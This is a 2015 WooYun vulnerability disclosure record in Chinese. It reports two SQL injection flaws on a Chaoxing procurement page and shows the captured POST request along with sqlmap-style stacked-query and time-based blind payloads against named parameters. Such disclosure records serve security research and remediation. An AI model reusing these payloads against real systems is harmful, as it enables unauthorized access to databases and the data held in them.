{"id": 33657, "wybug_id": "wooyun-2015-0108324", "wybug_title": "超星某站两处SQL注入漏洞", "wybug_corp": "超星网", "wybug_author": "ucifer", "wybug_date": "2015-04-19 11:08", "wybug_open_date": "2015-06-05 13:30", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-05：\t细节向公众公开  简要描述： RT 详细说明：  http://cg.chaoxing.com/set_password.aspx 这个页面是禁止使用的，但是在随后的过程中，通过抓包可以定位到可注入的页面。\n\n简单测试一下 存在POST注入。post.txt文件如下:\nPOST /set_password.aspx HTTP/1.1Host: cg.chaoxing.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://cg.chaoxing.com/set_password.aspxCookie: msign_dsr=1428996158882; __utma=68824131.282036900.1428999176.1428999176.1429147930.2; __utmz=68824131.1428999176.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmb=68824131.3.9.1429147931475; __utmc=68824131Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 167__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwULLTExNjY5MDI0MjlkZA%3D%3D&TextBox1=111%40qq.com&TextBox2=123123123123&Button1=%E4%BF%9D%E5%AD%98%E4%BF%A1%E6%81%AF\n\nPlace: POSTParameter: TextBox1    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=/wEPDwULLTExNjY5MDI0MjkPZBYCAgMPZBYCAhMPDxYCHgRUZXh0BU08c2NyaXB0IHR5cGU9J3RleHQvamF2YXNjcmlwdCc+YWxlcnQoJ+S4quS6uuS/oeaBr+S/ruaUueaIkOWKn++8gScpPC9zY3JpcHQ+IGRkZA==&TextBox1=111@qq.com'; WAITFOR DELAY '0:0:5'--&TextBox2=123123123123&Button1=%E4%BF%9D%E5%AD%98%E4%BF%A1%E6%81%AF    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=/wEPDwULLTExNjY5MDI0MjkPZBYCAgMPZBYCAhMPDxYCHgRUZXh0BU08c2NyaXB0IHR5cGU9J3RleHQvamF2YXNjcmlwdCc+YWxlcnQoJ+S4quS6uuS/oeaBr+S/ruaUueaIkOWKn++8gScpPC9zY3JpcHQ+IGRkZA==&TextBox1=111@qq.com' WAITFOR DELAY '0:0:5'--&TextBox2=123123123123&Button1=%E4%BF%9D%E5%AD%98%E4%BF%A1%E6%81%AFPlace: POSTParameter: TextBox2    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=/wEPDwULLTExNjY5MDI0MjkPZBYCAgMPZBYCAhMPDxYCHgRUZXh0BU08c2NyaXB0IHR5cGU9J3RleHQvamF2YXNjcmlwdCc+YWxlcnQoJ+S4quS6uuS/oeaBr+S/ruaUueaIkOWKn++8gScpPC9zY3JpcHQ+IGRkZA==&TextBox1=111@qq.com&TextBox2=123123123123'; WAITFOR DELAY '0:0:5'--&Button1=%E4%BF%9D%E5%AD%98%E4%BF%A1%E6%81%AF    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=/wEPDwULLTExNjY5MDI0MjkPZBYCAgMPZBYCAhMPDxYCHgRUZXh0BU08c2NyaXB0IHR5cGU9J3RleHQvamF2YXNjcmlwdCc+YWxlcnQoJ+S4quS6uuS/oeaBr+S/ruaUueaIkOWKn++8gScpPC9zY3JpcHQ+IGRkZA==&TextBox1=111@qq.com&TextBox2=123123123123' WAITFOR DELAY '0:0:5'--&Button1=%E4%BF%9D%E5%AD%98%E4%BF%A1%E6%81%AF---\n两个参数都存在注入。。   漏洞证明：  \n\n   修复方案：  严格过滤   版权声明：转载请注明来源 ucifer@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-04-21 13:29 厂商回复： 影响公司采购系统，感谢漏洞提出者 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}